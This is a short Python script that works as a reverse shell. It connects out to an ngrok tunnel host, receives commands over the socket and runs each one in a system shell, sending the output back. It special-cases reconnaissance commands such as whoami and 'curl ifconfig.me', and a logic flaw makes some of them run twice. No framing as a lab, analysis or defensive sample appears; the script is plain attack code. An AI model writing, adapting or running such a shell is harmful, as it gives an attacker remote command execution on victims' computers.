
import subprocess
import socket
ip="0.tcp.ngrok.io"
port=13842


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.connect((ip,port))
while True:
     command=s.recv(1024)
     if command == b'exit':
          s.close()
          break


     if command==b'ifconfig':
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
         output = proc.stdout.read() + proc.stderr.read()
         s.send(output)

     if command==b'curl ifconfig.me':
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
         output = proc.stdout.read() + proc.stderr.read()
         s.send(output)


     if command==b'whoami':
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
         output = proc.stdout.read() + proc.stderr.read()
         s.send(output)

     else:
         proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
         output = proc.stdout.read() + proc.stderr.read()
         s.send(output)
